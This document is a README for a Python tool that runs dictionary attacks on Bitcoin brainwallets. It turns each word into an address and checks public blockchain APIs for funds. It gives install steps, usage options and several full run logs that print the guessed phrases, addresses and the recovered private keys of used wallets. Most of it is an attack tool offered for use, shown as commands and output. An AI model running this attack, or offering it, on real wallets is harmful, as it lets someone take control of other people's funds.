bruteforce-bitcoin-brainwallet
==============================

A python script that performs a bruteforce dictionary attack on brainwallets. It takes a dictionary input file
 and converts each word into a bitcoin address. A lookup of this address is done either using a local [Abe](https://github.com/jtobey/bitcoin-abe)
 instance, blockchain.info, or insight.bitpay.com to see if any bitcoins have ever been received by this address. If so, it will do one more check
 to see the current balance for the bitcoin address.

#Requirements
* Dictionary file in UTF-8 format (***other formats NOT SUPPORTED***)
* Python 2.7 (***3.x NOT SUPPORTED***), requests, coinkit
<pre>
pip install -r requirements.txt
</pre>

#Usage
```
usage: bbb.py [-h] -t TYPE -d DICT_FILE -o OUTPUT_FILE [-s SERVER] [-p PORT]
              [-c CHAIN] [--version]

A script to perform bruteforce dictionary attacks on brainwallets.

optional arguments:
  -h, --help      show this help message and exit
  -t TYPE         Blockchain lookup type (abe|blockchaininfo|insight)
  -d DICT_FILE    Dictionary file (e.g. dictionary.txt)
  -o OUTPUT_FILE  Output file (e.g. output.txt)
  -s SERVER       Abe host address (e.g. localhost)
  -p PORT         Abe port (e.g. 2751)
  -c CHAIN        Abe chain string (e.g. Bitcoin)
  --version       show program's version number and exit
```

#Abe Example
```
python bbb.py -t abe -d dictionary.txt -o found.txt -s 127.0.0.1 -p 2751 -c Bitcoin
2014-04-03 21:24:37,552 INFO   line 59   Opening session for abe
2014-04-03 21:24:37,552 INFO   line 17   Opening new session to http://127.0.0.1:2751
2014-04-03 21:24:37,563 INFO   line 171  Starting new HTTP connection (1): 127.0.0.1
2014-04-03 21:24:37,749 INFO   line 63   Opening dictionary file dictionary.txt for reading
2014-04-03 21:24:37,749 INFO   line 72   Opening output file found.txt for writing
2014-04-03 21:24:37,750 INFO   line 75   dictionary word, received bitcoins, wallet address, private address, current balance
2014-04-03 21:24:38,490 INFO   line 101  a,0.01000000,1HUBHMij46Hae75JPdWjeZ5Q7KaL7EFRSD,ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb,0.00000000
```

#Blockchain.info Example (note: 10 second wait between API calls)
```
python bbb.py -t blockchaininfo -d dictionary.txt -o found.txt
2014-04-03 21:38:48,893 INFO   line 100  Note there is a 10 second wait between each API call to respect posted limits
2014-04-03 21:38:48,893 INFO   line 59   Opening session for blockchaininfo
2014-04-03 21:38:48,893 INFO   line 18   Opening new session to http://blockchain.info
2014-04-03 21:38:48,903 INFO   line 171  Starting new HTTP connection (1): blockchain.info
2014-04-03 21:38:49,672 INFO   line 63   Opening dictionary file dictionary.txt for reading
2014-04-03 21:38:49,673 INFO   line 72   Opening output file found.txt for writing
2014-04-03 21:38:49,673 INFO   line 75   dictionary word, received bitcoins, wallet address, private address, current balance
2014-04-03 21:40:02,313 INFO   line 101  a,0.01000000,1HUBHMij46Hae75JPdWjeZ5Q7KaL7EFRSD,ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb,0.00000000
```

#Insight Example
```
python bbb.py -t insight -d dictionary.txt -o found.txt
2014-09-11 20:34:17,863 INFO   line 62   Opening session for insight
2014-09-11 20:34:17,863 INFO   line 20   Opening new session to https://insight.bitpay.com
2014-09-11 20:34:17,876 INFO   line 696  Starting new HTTPS connection (1): insight.bitpay.com
2014-09-11 20:34:18,419 INFO   line 67   Opening dictionary file dictionary.txt and validating encoding is utf-8
2014-09-11 20:34:18,419 INFO   line 78   Opening dictionary file dictionary.txt for reading
2014-09-11 20:34:18,419 INFO   line 81   Opening file with encoding utf-8
2014-09-11 20:34:18,419 INFO   line 90   Opening output file found4.txt for writing
2014-09-11 20:34:18,419 INFO   line 93   dictionary word, received bitcoins, wallet address, private address, current balance
2014-09-11 20:34:22,654 INFO   line 153  Found used brainwallet: a,0.01000000,1HUBHMij46Hae75JPdWjeZ5Q7KaL7EFRSD,ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb,0.00000000

```

#private key example (also known as secret exponent, mixed hex and wif format)
```
python bbb.py -d keys.txt -t insight -o found.txt -k
2014-09-16 12:13:55,301 INFO   line 64   Opening session for insight
2014-09-16 12:13:55,301 INFO   line 20   Opening new session to https://insight.bitpay.com
2014-09-16 12:13:55,338 INFO   line 696  Starting new HTTPS connection (1): insight.bitpay.com
2014-09-16 12:14:09,152 INFO   line 69   Opening dictionary file keys.txt and validating encoding is utf-8
2014-09-16 12:14:09,153 INFO   line 80   Opening dictionary file keys.txt for reading
2014-09-16 12:14:09,154 INFO   line 83   Opening file with encoding utf-8
2014-09-16 12:14:09,155 INFO   line 92   Opening output file found.txt for writing
2014-09-16 12:14:09,155 INFO   line 95   dictionary word, received bitcoins, wallet address, private address, current balance
2014-09-16 12:14:23,951 INFO   line 155  Found used wallet: 6d88fd5f906a89858aca2a963d82d6e36cdf409871a88f6e79749ba21f021421,0.00005460,18XHQxYKXeXdiJzi5Z5XTojzeY3xHAoLCA,6d88fd5f906a89858aca2a963d82d6e36cdf409871a88f6e79749ba21f021421,0.00000000
2014-09-16 12:14:37,083 INFO   line 155  Found used wallet: 5JPqywvhpz2QqvLhT54htZZAZ1A3dwh4MGhjoLEH9mMhgReyHGu,0.00005460,1N61ZkMkCKbAWBQzgucPZNLcN591rMzVd,4c32f19462ec62f9edabb65fd838307aed4683b1d506a702bd648e9a779a3cc4,0.00000000
2014-09-16 12:14:48,654 INFO   line 155  Found used wallet: c94ad2d92135458a0faebbb62b16af3012b6179f1128a2e09a3848172b3ad76b,0.00005460,14Y66Et3Ew2ddq7QwpeLBbQ761b7rrCz7H,c94ad2d92135458a0faebbb62b16af3012b6179f1128a2e09a3848172b3ad76b,0.00000000

```